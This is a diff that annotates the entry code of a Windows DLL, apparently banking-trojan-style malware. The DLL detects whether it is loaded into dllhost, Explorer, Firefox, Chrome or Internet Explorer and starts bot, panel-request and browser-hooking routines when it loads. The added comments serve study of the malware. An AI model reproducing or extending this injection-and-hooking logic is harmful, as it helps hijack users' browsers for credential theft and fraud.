@@ -9,7 +9,8 @@ extern "C" int _fltused = 0;
 #include "Explorer.h"
 #include "Bot.h"
 
-static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
+static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)    /* checks if the window (referenced by hwnd) 
+                                                                     belongs to the current process */ 
 {
    DWORD pid;
    Funcs::pGetWindowThreadProcessId(hwnd, &pid);
@@ -18,11 +19,11 @@ static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
    return TRUE;
 }
 
-static void WaitForWindow()
+static void WaitForWindow()                                       /* waits until the current process window appears */
 {
    for(;;)
    {
-      if(!Funcs::pEnumWindows(EnumWindowsProc, NULL))
+      if(!Funcs::pEnumWindows(EnumWindowsProc, NULL))             // checks if there is a particular window running
          return;
       Sleep(100);
    }
@@ -32,36 +33,37 @@ static DWORD WINAPI EntryThread(LPVOID lpParam)
 {
    char  exePath[MAX_PATH] = { 0 };
    char *exeName;
-   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);
-   exeName = Funcs::pPathFindFileNameA(exePath);
+   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);           // assignes a fully qualified name to exePath
+   exeName = Funcs::pPathFindFileNameA(exePath);                  // exeName points to the executable name (found in exePath) 
 
    char mutexName[MAX_PATH] = { 0 };
    char botId[BOT_ID_LEN]   = { 0 };
 
 
-   if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)
+   if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)          // if exeName == dllhost.exe
    {
 #if !_WIN64
       InitPanelRequest();
       InitWow64ext();
       StartBot();
 #endif
+      // if compiled as 32 
    }
-   else if(Funcs::pLstrcmpiA(exeName, Strs::explorerExe) == 0)
+   else if(Funcs::pLstrcmpiA(exeName, Strs::explorerExe) == 0)    // if ... == explorer.exe
       HookExplorer();
-   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)
+   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)     // if ... == firefox.exe
    {
       WaitForWindow();
-      InitPanelRequest();              
+      InitPanelRequest();
       HookFirefox();
    }
-   else if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)
+   else if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)      // if ... == chrome.exe
    {
       WaitForWindow();
       InitPanelRequest();
       HookChrome();
    }
-   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)
+   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)    // if ... == iexplore.exe
    {
       WaitForWindow();
       InitPanelRequest();
@@ -79,7 +81,7 @@ BOOL WINAPI DllMain
 {
    switch(dwReason)
    {
-     case DLL_PROCESS_ATTACH:
+     case DLL_PROCESS_ATTACH:                                     // means that the dll is loaded into the current process 
      {
          InitApi();
          Funcs::pCreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
